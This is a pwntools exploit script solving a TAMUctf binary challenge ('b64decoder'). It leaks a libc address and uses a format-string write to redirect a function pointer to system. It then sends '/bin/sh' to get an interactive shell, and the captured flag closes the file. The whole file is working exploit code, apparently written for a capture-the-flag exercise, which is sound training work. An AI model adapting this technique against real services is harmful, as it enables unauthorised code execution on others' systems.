import pwn
import re


HOST, PORT = 'challenges.tamuctf.com', 2783
DEBUG = False

if DEBUG:
    env = {'LD_PRELOAD': './libc.so.6'}
    p = pwn.process(['./ld-linux.so.2', './b64decoder'], env=env)
else:
    p = pwn.remote(HOST, PORT)
pwn.context.log_level = 'DEBUG'

libc = pwn.ELF('./libc.so.6')

regex = r'0x[0-9a-f]+'
line = p.recvline_regex(regex).decode()
a64l_libc = int(re.search(regex, line).group(), 16)

libc_base = a64l_libc - libc.symbols['a64l']
pwn.log.info('libc.so.6: 0x{:08X}'.format(libc_base))

system_libc = libc_base + libc.symbols['system']

p.recvuntil('Enter your name!  \n')

fsb_payload = '%{}c%77$hn'.format(system_libc & 0xFFFF).encode()
fsb_payload = fsb_payload.ljust(0x18, b'\x00')
fsb_payload += pwn.p32(0x0804B398)
fsb_payload = fsb_payload.ljust(0x1F, b'\x00')

p.send(fsb_payload)

p.recvuntil('Welcome, ')
a = p.recvline(keepends=False)

p.sendline('/bin/sh')

pwn.context.log_level = 'INFO'
p.interactive()

# gigem{b1n5h_1n_b45364?}
